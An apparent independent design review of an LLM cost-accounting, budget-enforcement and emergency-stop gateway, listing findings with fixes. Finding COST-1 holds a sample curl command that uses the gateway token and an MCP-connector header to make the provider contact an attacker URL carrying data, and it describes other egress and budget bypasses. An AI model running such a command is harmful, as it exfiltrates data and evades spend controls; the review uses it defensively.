# Independent review: cost accounting, model routing, budgets, emergency stop, Model Gateway

**Reviewer:** independent fresh-context reviewer (Stage 0, SPEC §132 "cost accounting" cross-review)
**Date:** 2026-10-14
**Area ID prefix:** `COST`

## 1. Scope reviewed

Read in full:

- SPEC §0, §4, §75–§82, §86, §88, §90–§94, §96–§97, §125, §132
- `plans/53-model-gateway.md`, `plans/31-model-routing.md`, `plans/32-cost-accounting.md`, `plans/33-budget-enforcement.md`
- `contracts/cost-record.schema.yaml`, `pricing.schema.yaml`, `budget-policy.schema.yaml`, `model-routing.schema.yaml` (provider, model and RoutingDecision definitions plus examples), `gateway-token.schema.yaml`
- `adr/0004-model-gateway.md`, `0450`, `0451`, `0452`
- `procedures/budget-emergency-stop.md`, `pricing-update.md`, `gateway-failure.md`, `rotate-model-credentials.md`
- `plans/reference/prior-implementation-lessons.md` (L-1, L-3, L-4), `plans/reviews/consolidation-decisions.md`

Read only the sections relevant to this area:

- plan 39 (Economics dashboards and the `grafana_ro` grants)
- plan 42 (budget, spend and e-stop catalogue rows)
- plan 24 (§9 managed config, §14.5, network and failure tables)
- plan 28 (§7.3 base URLs, Claude Code env, R01 smoke, fake scenarios)
- plan 29 (failure classes, budget/BLOCKED handling, attempt refunds)
- plan 21 (§9.2 phase tags)
- plan 26 (dispatch steps, e-stop, RBAC)
- plan 35 (signing-key rotation)
- plan 36 (egress-proxy forbidden hosts)
- plan 45/50 (recovery e-stop)
- plan 54 (chart RBAC and lint)
- plan 55 (PR cardinality)
- `plans/dag.yaml`, `plans/spec-issues.md`
- `contracts/alert-catalog.yaml` (rows for this area)
- `procedures/restore-cnpg.md`, `agent-runner-failure.md`, `total-cluster-loss.md` (e-stop steps)

## 2. Verdict

**PASS WITH FIXES.**

The architecture is sound and better than most designs of this kind:

- one Gateway path for every billable call;
- integer micro-USD;
- atomic worst-case reservations under row locks taken in key order;
- `unpriced` kept distinct from zero;
- a disjoint cache normalization with a regression test;
- an immutable ledger with priced snapshots;
- a three-source emergency stop whose Kubernetes source works without the Runner, the DB or Flux, and which Flux cannot revert.

On the questions the brief asked about:

- **Concurrency.** Concurrent admission cannot over-admit against the same headroom.
- **Emergency stop.** It holds when the Runner, the DB or Flux is broken.
- **Flux.** It cannot prune or overwrite the ConfigMap source.

Four things still need fixing:

1. The Gateway's request filter is a denylist. It lets **billable, non-token-priced and egress-bypassing provider features** through (COST-1). This is a blocker.
2. The shipped budget defaults, combined with the worst-case estimator, make the primary harness (Claude Code) and Hermes fail with budget denials in normal operation.
3. Reservation contention is treated as exhaustion and parks tasks in human-only states.
4. Two of the ten SPEC §80 queries give wrong answers or answer a narrower question.

### DoD sign-off (SPEC §125)

| DoD item | Sign off? | Reason |
|---|---|---|
| cost-record schema is defined | **Yes** (minor fixes COST-12, COST-13, COST-17) | `cost-record.schema.yaml` maps every §79 field and keeps disjoint usage semantics, pricing version, digest, rates and the reservation/charge split, with valid and invalid examples. Gaps: the content of `usage`/`cost` for `usage_status: unknown` is not defined, there is no service-tier normalization, and one example is inconsistent. |
| economic circuit breakers are defined | **No — yes after COST-1 is fixed and COST-2, -3, -4 and -7 are addressed** | Every §81 limit and the emergency stop are defined, enforced at a single point, and covered by deterministic ACs. However: per-use provider features bypass token-priced reservations (COST-1); the stated overrun bound is false (COST-4); the shipped defaults cannot run the primary harness (COST-2); and a task-scope shortfall at dispatch produces no notification (COST-7, SPEC §81 "visible human notification"). |
| model/harness abstraction is defined | **Yes** (fix COST-6) | Tiers as data, harness/family compatibility, a pure deterministic resolver, ladders, fallback, tighten-only overrides and token allowlists are all specified and tested. The Hermes auxiliary-model contradiction between plans 24 and 31 must be resolved. |

## 3. Findings (ordered by severity)

### Blocker

**COST-1 — The provider-feature denylist lets billable and egress-capable requests through the Gateway unaccounted.**

*Location:* plan 53 §7.2 ("All other request headers pass through… Pass-through is safe on cost because pricing derives from *reported* usage"), §7.3 "Provider-hosted tools", §8 `request inspector`, §14.1 step 4; ADR-0004.

*Problem (the plan is wrong, not merely silent).* The Gateway rejects only an enumerated list of tool types and lets every other body member and every non-`oauth-` `anthropic-beta` value through:

1. **OpenAI Responses.** Tool types are matched exactly (`web_search`, `web_search_preview`, …), so dated variants such as `web_search_preview_2025_03_11` pass (verify).
2. **Chat Completions** (the DeepSeek, Z.ai, Hermes and OpenCode route) has **no** tool check at all:
   - Z.ai GLM accepts `tools:[{type:"web_search"…}]` and `retrieval`, which are billed per call and executed provider-side;
   - OpenAI's `web_search_options` likewise.
3. **Anthropic.**
   - The top-level `mcp_servers` (MCP connector), enabled by an `anthropic-beta` value that passes, makes Anthropic's servers call arbitrary remote URLs.
   - Content blocks with `source.type: "url"` (images, documents) and Responses `input_image.image_url` / `input_file.file_url` make the provider fetch arbitrary URLs.
4. **Price-affecting parameters pass through.** Examples (verify on pinned versions): `service_tier`, premium-speed modes, and `context-1m-*` betas on a model routed with `contextWindowTokens: 200000`. Such requests are billed at rates that token counts at standard rates do not reflect, so the claim "pricing derives from reported usage" is false.

*Attack scenario.* The gateway token is in the worker's environment, and repository code (tests, build scripts) runs in that pod. A hostile test does the following:

```sh
curl $ANTHROPIC_BASE_URL/v1/messages -H "x-api-key: $ANTHROPIC_API_KEY" \
  -H 'anthropic-beta: mcp-client-…' \
  -d '{"model":"<allowed>","max_tokens":16,"mcp_servers":[{"type":"url","url":"https://attacker/?d=<data>"}],…}'
```

The result is a provider-side connection to an arbitrary host. That is exfiltration that bypasses SPEC §88. Per-use web search or fetch charges are not captured by token pricing (SPEC §78, §81), and the budget is enforced against a floor, which L-3 forbids.

*Fix.*

- **Plan 53 §7.2–§7.3, §8, §14.1:** replace the denylist with **per-family allowlists** declared in `ModelRouting.providers.<p>.apiFamilies.<f>`:
  - `allowedBodyMembers` (top level);
  - `allowedToolTypes`:
    - Anthropic: absent or `custom`;
    - Chat: `function`;
    - Responses: `function`, `custom`, plus only those client-executed types the pinned Codex is verified to send;
  - `allowedAnthropicBeta` (exact values or prefixes, replacing `anthropicBetaDenyPrefixes`).
- Deny any content block whose source is not inline (`url`, `file`, `file_id`, non-`data:` `image_url`, `file_url`) with `SC_UNSUPPORTED_PARAMETER`.
- Pin or deny price-affecting parameters unless a matching priced entry exists (see COST-13).
- **Add 53-ACs, one fixture each:**
  - dated Responses search tool;
  - Z.ai `web_search` chat tool;
  - `mcp_servers` plus beta;
  - URL image;
  - URL document;
  - unknown top-level member.

  Each is denied with zero upstream contact.
- **Extend 53-AC-17 / 53-AC-23** to assert that the pinned Claude Code, Codex and Hermes request members all lie inside the allowlists, so the allowlist does not break the harnesses.
- **Update ADR-0004** "Decision" and "Verification" accordingly.

### Major

**COST-2 — The worst-case estimator combined with the shipped defaults denies normal Claude Code and Hermes traffic.**

*Location:* plan 53 §14.1 step 6; plan 33 §9.1, §9.1a; plan 28 R01 ("maxTaskCostUsd: 2.00"); `budget-policy.schema.yaml`.

*Problem.*

- Every estimated input token is priced at `max(input, cachedInput, cacheWrite, cacheWrite1h)`, which is the 1-hour cache-write rate (2× input). Every long-context tier below `contextWindowTokens` is also included.
- `est_input = bytes/2` is not capped at the context window. Claude Code traffic is mostly cache reads.

The illustrative Sonnet card ($3/$15, 1h write $6) shows the effect:

| Request | Worst case | Shipped limit | Result |
|---|---|---|---|
| Sonnet, ≈150 k-token context (≈560 KB) | 280 k × $6 + 32 k × $15 = **$2.16** | `perRequest.maxCostUsd` $2.00 | `SC_REQUEST_COST_CAP`, so the task goes to `NEEDS_HUMAN` |
| Opus-class ($5/$25) | exceeds the cap | $2.00 | denied at ≈65 k tokens of context |
| 1M-context Sonnet ($12 / $22.50 tier) | exceeds the cap | $2.00 | denied at ≈55 k tokens |
| R01 smoke on `sc-e2e/fake-target`, Sonnet tester | ≈$0.75–0.85 per request | task limit **$1.00** (plan 33) | the task scope denies after about $0.2 of real spend |

Further effects:

- Plan 28 says the R01 task budget is **$2.00**, contradicting plan 33's $1.00.
- `perExecution.maxTotalTokens: 10 M` counts cached-read tokens, so a 150-turn Claude Code session at 80 k tokens per turn (12 M tokens, ≈$1–4) is cut off.
- `global.hourlyUsd: 10` cannot hold 6 concurrent $1.8 reservations (see COST-3).

No acceptance criterion checks the defaults against a realistic request-size distribution. R01 would therefore fail as shipped.

*Fix.*

- **Plan 53 §14.1:**
  - price estimated input at `max(input, cacheWrite)`, and use `cacheWrite1h` only when the bounded body parse finds a `cache_control` with `ttl:"1h"`;
  - cap `est_input` at the model's effective context window;
  - choose long-context tiers by the effective window (see COST-4).
- **Plan 33 §9.1:** make `maxTotalTokens` count uncached input + cache-write + output + reasoning (exclude cache reads), or weight tokens by rate.
- **Plan 33 §9.2:** add an F04 invariant: for each enabled production model, the worst case at full context with the injected output cap is ≤ `perRequest.maxCostUsd`; otherwise the policy is rejected. Alternatively, introduce `perRequest.maxCostUsdByTier`.
- **Plan 33 §9.2:** require `dispatch.minimumHeadroomUsd[tier]` ≥ that worst case.
- **Plans 33 and 28:** use one R01 budget number in both.
- **New AC at R01 (and a C06 replay test):** replay the recorded request-byte sizes from the R01 Claude Code fixtures through the estimator. Assert zero `SC_REQUEST_COST_CAP` and that the peak concurrent reservations of one execution fit `global.hourlyUsd`.

**COST-3 — Reservation contention is classified as exhaustion and moves tasks to human-only states.**

*Location:* plan 33 §14.2 (f), §14.4 (`sc_budget_exhausted` set by `last_denied_at`), §14.5.

*Problem.*

- A denial in which `spent + amount ≤ limit` but `spent + reserved + amount > limit` is *transient*: headroom returns as soon as in-flight requests settle (usually at a small fraction of their reservation).
- The plan still returns `SC_BUDGET_EXHAUSTED`. The consequences are:
  - the execution fails with class `budget`;
  - the task moves to `NEEDS_HUMAN` (execution or task scope) or `BLOCKED` (shared scope), and only a human can resume it (L-4);
  - `last_denied_at` makes `sc_budget_exhausted = 1`, which pages `SCBudgetExhausted` (critical, `budget-stop`) while utilization may be 20 %.
- Under the shipped defaults, one healthy execution with `maxConcurrentRequests: 8` triggers this on `global-hour`.

*Fix.*

- **Plan 33 §14.2:** add dimension `cost_reserved` and code `SC_BUDGET_CONTENDED`. The Gateway first waits up to a bounded time (e.g. ≤ 30 s, re-checking when a settlement for the same scope commits), then answers 429 with `retry-after`.
- **Plans 29 and 26:** classify a contention-only denial as infrastructure (no human-only state).
- **Plan 33 §14.4:** set `last_denied_at` only for spent-based denials.
- **Plan 53 §7.3:** add the code to the denial table.
- **New 33-AC:** two concurrent reservations that fit only sequentially both eventually succeed, and no task leaves its state.

**COST-4 — The stated overrun bound is false, and several input-under-estimation channels are not closed.**

*Location:* plan 33 §14.3 ("Overrun… is possible only when actual input tokens exceed est_input… at most `max_concurrent_requests × perRequest.maxCostUsd`"); ADR-0450 "Consequences"; plan 53 §14.2, §14.3.

*Problem.* Each of these produces an overrun even with a correct byte estimate, or makes input arbitrarily larger than the body:

- **Provider-side state:** Responses `previous_response_id`, `conversation`, stored `prompt` ids, and `store` defaulting to true. Each chained request bills the whole stored context while the body is a few hundred bytes.
- **File references:** `file_id` and URL sources (see COST-1).
- **PDF document blocks:** page images plus text cost far more tokens than bytes/2.
- **Beta-enabled long-context mode** on a model routed with a smaller `contextWindowTokens`. The long-context tier is excluded from the reservation rates even though the provider bills it.
- **Model mismatch to a pricier reported model.** It is priced at the reported model's rates (§14.2), but reserved at the requested model's.
- **Reasoning beyond the cap** (see COST-5).

Per-request overrun is bounded by the context window times the maximum rate (or more for a mismatch), not by `perRequest.maxCostUsd`. On shared scopes it is multiplied by every concurrent request of every execution.

*Fix.*

- **Plan 53 §14.3/§7.3:**
  - deny `previous_response_id`, `conversation` and `prompt`;
  - force `store:false` as a third documented mutation, or deny `store:true`;
  - with COST-1, deny non-inline sources;
  - deny PDF `document` blocks, or estimate them at a per-page token bound.
- **Plan 53 §14.1 step 6:**
  - derive the effective context window from the request (including any allowed beta) and include every tier below it;
  - reserve at the maximum rate over all `allowed_models` of the token (so mismatch cannot overrun);
  - price a mismatch at `max(requested, reported)`.
- **Plan 33 §14.3 and ADR-0450:** restate the bound correctly. Add a token-dense fixture AC (base64 or CJK body) that checks the `sc_gateway_reservation_overrun_micro_usd_total` accounting.

**COST-5 — The assumption "the provider-enforced output cap covers reasoning" is load-bearing and unverified, and cap aliases are not inspected.**

*Location:* plan 33 §14.3 ("Output is capped by the provider-enforced output cap"); plan 53 §14.3; `model-routing.schema.yaml` `outputCapField`.

*Problem.*

- For some reasoning models the documented `max_tokens` has applied to the final answer only, with chain-of-thought tokens on top. DeepSeek's reasoner did this historically; GLM thinking modes are unknown. In that case worst-case output is not bounded by the injected cap.
- Chat Completions has two cap fields (`max_tokens`, `max_completion_tokens`), but the inspector checks only the policy's `outputCapField`. A request carrying the *other* alias with a huge value is not denied. The Gateway then injects a second cap, and provider behavior with both fields is undefined.
- No VS item or AC covers either point.

*Fix.*

- **`model-routing.schema.yaml` Model:** add `outputCapCoversReasoning: bool` (required) and `maxReasoningTokens`. When false, the Gateway reserves `maxReasoningTokens` extra.
- **Plan 53 §19:** add VS-8 "cap covers reasoning", verified per provider by fixture plus `make smoke-providers` (53-AC-17 field `cap_covers_reasoning`).
- **Plan 53 §14.3:** the inspector reads every alias of the family. It denies if any alias exceeds the policy, and rewrites to the single policy field.

**COST-6 — Hermes's auxiliary model contradicts the routing and Gateway allowlist.**

*Location:* plan 24 §9 managed `config.yaml` (`auxiliary.<slot>.model: <orchestrator clerical model>`), plan 24 §14 watcher ("orchestrator clerical model"), plan 24 chart value `auxiliaryModel`; plan 31 §14.6 ("Allowlist = [primary]"); plan 53 §14.5.

*Problem (the plans contradict each other).* Hermes's compression, summarization and vision slots and the 5-minute watcher would call a model that is not in the orchestrator token's `allowed_models`. The Gateway denies them with `SC_MODEL_NOT_ALLOWED`. Hermes sessions then fail when context compression triggers, and the watcher never runs.

*Fix.* Choose one of:

- **Plan 31 §14.6 and the schema:** add `orchestrator.auxiliaryTier`. Resolve the auxiliary with the same filters, and mint it with `purpose: auxiliary`. Plan 24 pins every auxiliary slot to it.
- **Plan 24:** pins every slot and the watcher to the primary.

Extend 24-AC-5 / 31-AC-13: a conversation that triggers compression yields zero `SC_MODEL_NOT_ALLOWED` denials for the Hermes jti.

**COST-7 — A task-scope budget shortfall at dispatch is silent and leaves the task stuck.**

*Location:* plan 33 §14.5 last row ("unchanged for the first two (Hermes must wait)"), §14.1; plan 31 §14.5 item 5 (QUEUED re-validation → `FAILED` `BUDGET_EXCEEDED`); plan 26 §14.2 step 9; plan 29 §15.2.

*Problem.*

- When the `task:` scope lacks `minimumHeadroomUsd[tier]`, `agent_start` returns `BUDGET_EXCEEDED` and the task state does not change. Task headroom never comes back by waiting, and no notification fires (`SCTaskNeedsHuman` is posted only for `ATTEMPTS_EXHAUSTED`).
- Example: the shipped frontier headroom of $5 against a $15 task after four rungs. The escalation ladder's last rung is refused silently.
- The QUEUED re-validation timeout produces class `budget` with code `BUDGET_EXCEEDED`. That code has no row in plan 33 §14.5 or plan 29 §15.2.
- Plan 26 step 9 defines the pre-check differently ("profile's worst case", task/execution only).
- SPEC §81 requires "visible human notification" on exhaustion.

*Fix.*

- **Plan 33 §14.5:**
  - a dispatch refusal on `task:` moves the task to `NEEDS_HUMAN` (`budget_exceeded`, T106) and posts `SCTaskNeedsHuman`;
  - a refusal on a shared scope leaves the state unchanged, but must coincide with a notification (add rule `sc_runner_dispatch_refusals_total{code="BUDGET_EXCEEDED"}` increasing for 15 m → warning);
  - add the queued-timeout row.
- **Plan 26 §14.2 step 9:** align the text with plan 33 §14.1.
- **New 33-AC** for each case.

**COST-8 — Attempt counting in plan 33 conflicts with plans 29 and 31; the ladder's last rungs can become unreachable.**

*Location:* plan 33 §14.1 step 2, §9.1 rationale ("8 … also covers tester and reviewer executions"); plan 29 §16 (refunds for infrastructure / `BUDGET_SHARED_EXHAUSTED`); plan 31 §9.2 ladders.

*Problem.*

- Plan 33 counts every execution that reached `STARTING` except `EMERGENCY_STOP`, including infrastructure failures and shared-budget stops that plan 29 refunds.
- The shipped ladders alone allow 3 tester + 5 implementer executions, plus ≥ 1 reviewer, plus up to 2–3 infrastructure requeues. The total exceeds 8.
- `ATTEMPTS_EXHAUSTED` therefore fires before the frontier rung that SPEC §74's "approximately five autonomous attempts" relies on. 31-AC-6 passes only because it uses a test policy.

*Fix.*

- **Plan 33 §14.1:** exclude refunded executions (the plan 29 refund rule).
- **F04 invariant:** `perTask.maxAttempts ≥ Σ rungs(tests) + Σ rungs(implementation) + retry.maxReviews + retry.infrastructure.maxConsecutive`. Set the default accordingly.
- Run 31-AC-6 under the shipped policy as well.

**COST-9 — Two SPEC §80 queries are wrong, and §82 "specification cost" is only partly answerable.**

*Location:* plan 32 §14.4 Q8 and Q10, §2 interpretations, §14.5 views.

*Problem.*

- **Q8 ("Is Sonnet cheaper per accepted task…") over-counts.** It joins `runner.v_execution_outcomes`, which has one row per execution, on `task_id … AND o.human_accepted`. Every cost row is multiplied by the task's execution count, so cost per accepted task is inflated roughly N-fold.
- **Q10 ("money spent on failed work") answers a narrower question.** It counts only executions in `FAILED/TIMED_OUT/CANCELLED` and cancelled tasks. The dominant category is missing: executions that `SUCCEEDED` but whose output was rejected, namely:
  - GREEN fail, which plan 29 records as a task event after a successful implementer execution;
  - RED invalid or `TEST_NEEDS_WORK`;
  - review `changes_requested`;
  - PRs closed unmerged.
- **Specification cost.** Hermes writes the acceptance criteria (plan 24 skill `sc-writing-acceptance-criteria`), but its spend is `orchestration` with no task. Specification cost per task therefore covers only planner and researcher executions.
- **Test independence.** 32-AC-8 "golden results" could be generated from the same SQL and would not catch any of this.

*Fix.*

- **Plan 32 §14.4:**
  - rewrite Q8 with a per-task CTE `accepted AS (SELECT DISTINCT task_id FROM runner.v_execution_outcomes WHERE human_accepted)`;
  - define failed work as the spend of executions whose output did not survive (worker failure, a negative verification or review outcome for that execution's commit, or a task cancelled or closed unmerged), with a breakdown by reason.
- **32-AC-8:** golden values are hand-computed and committed independently of the SQL, and the seed includes a task with ≥ 3 executions that is accepted.
- **Hermes attribution:** either let the Runner pass an MCP-scoped `task_id` hint into a per-task orchestrator sub-scope, or record this as a SPEC interpretation (see §5).

**COST-10 — The DAG gates C05 and C06 require nodes they do not depend on, and C05 requires paid calls.**

*Location:* `plans/dag.yaml` C05 (`deps: [C01]`) and C06 (`deps: [C05, P09]`); 31-AC-4…8 and -11; 33-AC-4/5/7/9/16; 53-AC-17; plan 53 §25 Q3.

*Problem (the DAG is wrong).*

| AC | Needs | Owning node | In the gate's deps? |
|---|---|---|---|
| 31-AC-4…8 | `agent_start` dispatch of fake-harness Jobs | C02, F07 | no |
| 31-AC-6 | GREEN failures | C04 | no |
| 31-AC-11 | Forgejo base-revision override | C03 | no |
| 33-AC-5, -7, -16 | Job creation and deletion | C02 | no |

The worst case is 53-AC-17, run "at C05", which requires ≤ 31-day real-provider evidence for every provider enabled in production routing (`anthropic` and `deepseek` ship enabled). GATE-C05 therefore needs real keys and paid calls. That contradicts plan 53 §25 Q3 ("Blocking: no for C05") and the intent of SPEC §104. As written, GATE-C05 and GATE-C06 cannot pass at their DAG position.

*Fix.*

- **`dag.yaml`:**
  - C06 deps += C02;
  - move 31-AC-4…8 and -11 to GATE-C10, or add C02, C03 and C04 to C05's deps (moving them is preferred);
  - 33-AC-5, -7, -9 and -16 run at C10, or C06 gains C02.
- **53-AC-17:** applies at R01, and at C05 only for providers whose key is present.

### Minor

**COST-11 — The Anthropic stream abort can under-charge output.**

*Location:* plan 32 §8 (anthropic: "take max per field"); plan 53 §14.4 (estimated: "reported components kept").

*Problem.* `message_start.usage.output_tokens` (typically 1) could be treated as a reported output component. An abort after `message_start` would then charge 1 output token instead of `out_cap`. 53-AC-9 catches this only through `estimated_fields`.

*Fix.* The dialect table states that output components are taken only from `message_delta`.

**COST-12 — Unknown-usage rows and e-stop-cut status are underspecified.**

*Location:* `cost-record.schema.yaml` description; plan 32 §7.2; plan 33 §14.6; plan 53 §14.4.

*Problem.*

- For `usage_status: unknown` with `pricing_status: priced`, the schema requires a `cost` object but never says what `usage` and `cost` contain. Reports summing `cost_total_micro_usd` could add 0.
- Plan 33 §14.6 says an e-stop cut is always `estimated`. Plan 53 §14.4 makes "no usage observed" `unknown`.
- A connection reset after the request was sent but before headers arrive has no row in the §14.4 table.

*Fix.*

- For `unknown`, usage is the reservation's estimate (all fields in `estimated_fields`) and cost is the priced worst case, so totals are conservative.
- Align plan 33 §14.6 with plan 53 §14.4.
- Add a default rule: any termination after request bytes were written with no usage → `unknown`.

**COST-13 — No service-tier normalization or pinning.**

*Location:* plan 32 §9.2; `pricing.schema.yaml` `serviceTier` (`standard|priority|flex`); `cost-record.service_tier`.

*Problem.*

- Providers report `default`, `auto`, `standard_only`, `scale`, `priority` and others. No mapping to the pricing enum exists. OpenAI rows reporting `default` would all become `unpriced`.
- Anthropic's default `service_tier: auto` may consume Priority Tier capacity (verify).

*Fix.*

- A per-dialect tier mapping in plan 32 §8.
- A permitted mutation that pins the tier to a priced value when the request omits it (Anthropic `standard_only`, OpenAI `default`; verify).
- A fixture.

**COST-14 — The restore procedure does not say which e-stop path to engage, and a DB-source stop is erased by the restore itself.**

*Location:* `procedures/restore-cnpg.md` step 4; `budget-emergency-stop.md` "Re-assert after restore".

*Problem.*

- "Make sure the emergency stop is engaged first" is satisfied by path 1, whose event is then rolled back by the PITR.
- Re-assertion depends on human memory and Alertmanager history, which SPEC §4.1 says are not authoritative.

*Fix.* Before any `sc-pg` PITR, engage path 3 (ConfigMap) or path 2 (Git), never path 1. After the restore, compare against the ConfigMap or Git source.

**COST-15 — Alert catalogue text contradicts the design, and one alert is permanently noisy.**

*Location:* `alert-catalog.yaml` `SCModelUsageUnknown` ("Spend totals are floors") and `SCBudgetCostIncomplete` ("enforced against a floor").

*Problem.*

- Unknown usage is charged at the worst case, which is a ceiling. The catalogue text misleads operators.
- `SCBudgetCostIncomplete` fires for any single `estimated` row (every client disconnect or e-stop cut) for the rest of the month.

*Fix.*

- Correct the summaries.
- Condition the alert on `unknown` or `unpriced` rows, or on a share threshold over day scopes.

**COST-16 — Signing-key rotation ignores the Hermes orchestrator token.**

*Location:* plan 35 `SC-RUNNER-SIGNING` rotation ("max token TTL of 1 h 20 min"; emergency single-PR replace).

*Problem.*

- Execution tokens live ≤ 6 h and the Hermes token ≤ 90 days, both signed with this key.
- PR 3, or an emergency rotation, invalidates the Hermes token. The Runner re-mints it only when the allowlist changes or the token ages (ADR-0401), so Hermes stays down.
- `rotate-model-credentials.md` §D covers this by hand; plan 35 does not.

*Fix.*

- Plan 35 and ADR-0401: the Runner re-mints the orchestrator token whenever its `kid` differs from the current signing `kid`.
- Correct the stated TTL.

**COST-17 — Assorted cross-file inconsistencies.**

- **Plan 26 §5** says "Model Gateway … admin API for e-stop", but ADR-0452 says none exists.
- **Plan 50 CLI** has `estop set|clear --scope S`, which does not match the levels `none|workers|all`.
- **Plan 39 §7.2** says "applied by the Runner migration Job" (CD-04: in-process).
- **`cost-record` example 2** has `provider_success: false` for a completed 200 response.
- **Procedure A1** says "each new Idempotency-Key appends one event", but plan 33 §17 says re-setting the current level appends none.
- **The catalogue** gives `SCAnomalousSpend` owner "32"; plan 33 defines it.
- **Plan 24 H16** cites an "orchestration spend rate alert (plan 33)" that does not exist.
- **Plan 32 §21** does not say whether `sc_ledger_spend_micro_usd` sums `cost_total` or `budget_charge`.

*Fix:* each owning plan corrects its text.

**COST-18 — Model-provider hosts are not tied to the egress-proxy forbidden list.**

*Location:* plan 36 `EgressPolicy.forbiddenHosts`; `model-routing.schema.yaml`.

*Problem.* A provider added by a routing PR (for example an OpenRouter-style host) is not automatically forbidden at the proxy, so a repository delegation pattern could later open it.

*Fix.* F04 cross-file invariant: every `providers.*.upstream.baseUrl` host is matched by `forbiddenHosts`.

**COST-19 — "SDKs do not retry 403" is an unverified third-party assumption.**

*Location:* plan 53 §7.3.

*Problem.* Budget and e-stop denials are designed not to loop, but harness-internal retry loops (Claude Code, Codex, OpenCode, Hermes) are not verified.

*Fix.* Add an R01/C08 AC: after a budget denial, the harness makes ≤ 1 further request to the Gateway within 60 s.

**COST-20 — The escalation and success semantics in Q6 and Q7 lose information.**

*Location:* plan 31 §14.3; plan 32 Q6, Q7.

*Problem.*

- `tier_source` becomes `repository_capped` or `requested` when an escalation is capped, or when Hermes explicitly asks for the escalated tier. Q7 then misses those escalations.
- Q6 defines no success criterion for the reviewer role.

*Fix.*

- Record `escalation_rung` separately in `RoutingDecision`.
- Define reviewer success, or exclude the reviewer from Q6.

**COST-21 — Exact usage is lost after a 10-minute DB outage.**

*Location:* plan 53 §14.1 step 10.

*Problem.* After 10 minutes of in-memory settlement retries, observed usage is dropped. The sweeper then charges the worst case at `expires_at` (70 min), so a short DB outage inflates budgets and can page `SCBudgetExhausted`.

*Fix.* Keep retrying until `expires_at − 60 s`. On SIGTERM, block on outstanding settlements within the grace period.

**COST-22 — Retention deletes reservations that cost records reference.**

*Location:* plan 53 §8 sweeper; plan 33 §11.

*Problem.* Reservations are deleted after 30 days, but `cost_records.reservation_id` references them. An FK would make the deletion fail.

*Fix.* State explicitly that there is no FK, and test that retention leaves cost records intact.

**COST-23 — SPEC interpretations are not recorded.**

*Location:* plan 32 §2 says its interpretations are "recorded for spec-issues"; `plans/spec-issues.md` has none of them.

*Fix:* add the entries listed in §5.

## 4. Circular-dependency analysis

**DAG.** There are no cycles among C01 → C05 → C06 → C11, C08 ← (C01, C05, P07), C10 ← (C02…C09) and R01 ← C10. The defect is the opposite one: **missing edges** (COST-10). As written, GATE-C05 and GATE-C06 depend on behavior delivered by C02, C03, C04 and F07, and GATE-C05 on paid provider evidence.

**Runtime ordering.**

- **Gateway readiness** needs:
  - the Runner's in-process migrations (`runner.schema_migrations ≥ requiredSchemaVersion`);
  - the Git-committed `sc-runner-jwks` ConfigMap;
  - the Flux-delivered policy ConfigMap;
  - a non-empty provider key (the seeded `fake` key).
- **Runner readiness** does not depend on the Gateway (plan 26 `/readyz`), so there is no deadlock.
- The Runner's routing reads `ledger.provider_status`, which the Gateway leader writes. If the Gateway is down, dispatch returns `DEPENDENCY_UNAVAILABLE`. That is fail-safe, not a cycle.
- Token flow: the Runner mints the token and inserts the registry row before creating the Job, and the Gateway verifies both. They share only `sc-pg`, which fails closed.
- Bootstrap verify needs the Runner admin API to mint a verify-only token (plan 53 §25 Q4, open). This is ordering, not a cycle.

**Emergency stop.**

| Path | Depends on | Works when broken |
|---|---|---|
| 1 (DB) | Runner, `sc-pg`, K8s API (port-forward) | Flux |
| 2 (Git) | Forgejo, CI, human merge, Flux, kubelet sync | Runner, DB (survives PITR and black start) |
| 3 (ConfigMap) | K8s API only | Runner, DB, Flux |

- The Gateway reads path 3 with a direct GET. If the Gateway cannot read the API for 60 s, the level degrades to `workers` automatically. A dead DB means no spend. A dead Gateway means no spend. A Gateway that forwards despite a stop is handled by A4 (suspend the HelmRelease, then scale to 0) or by revoking keys at the provider console.
- **Flux cannot revert path 3:**
  - the object is never in an inventory;
  - CI lints forbid rendering it (18 check 11, 54-AC-4);
  - kustomize-controller prunes only its inventory, and helm-controller drift detection covers only chart-rendered objects;
  - 33-AC-12 re-verifies this on the pinned Flux.
- **Residual risk:** deleting the `strange-company` Namespace through GitOps would delete the ConfigMap. That is acceptable because it would take the whole stack down too.
- **The Git source cannot be silently lowered** by an invalid policy: the last-known-good is kept.
- **Black start** sets the Git source before any workload starts (ADR-0554, plan 50 commit-scope exception).
- **Gap:** the restore procedure does not say which path to use (COST-14).

**Key rotation.** The JWKS is published through Git before the Runner signs with a new key, so there is no cycle. The Hermes token gap is COST-16.

## 5. SPEC items for `plans/spec-issues.md`

| Proposed ID | SPEC § | Type | Text |
|---|---|---|---|
| SI-new-a | §78, §82 | Interpretation | Hermes (orchestrator) spend is attributed to project `_platform` and phase `orchestration` with no task, execution or attempt. Consequently, specification work Hermes performs (writing acceptance criteria) is not in a task's "specification cost". Either accept this, or add task-scoped orchestrator attribution (COST-9). |
| SI-new-b | §81 | Interpretation | "Maximum cost per provider request" can only be enforced on a pre-flight worst-case estimate. Actual cost can exceed it when input is under-estimated. Prevention therefore relies on reservations, on denying under-estimation channels (COST-4), and on an alerted, correctly bounded overrun. |
| SI-new-c | §79 | Interpretation | The outcome fields (`worker_success` … `human_accepted`) are not knowable when the row is written. Stored rows are immutable and carry `provider_success` only; the other outcomes are joined at read time (`record_view: enriched`). |
| SI-new-d | §80 | Interpretation | PR attribution is derived through the task (one `agent/<task-id>` branch and PR per task, plan 55), not stored per invocation. |
| SI-new-e | §88 | False assumption / clarification | "Approved model APIs" are themselves egress-capable: provider-hosted tools, MCP connectors and URL-sourced inputs make the provider fetch arbitrary hosts. Approval of a model API must be read as approval of a token-priced inference surface only, enforced by the Gateway's allowlist (COST-1). |
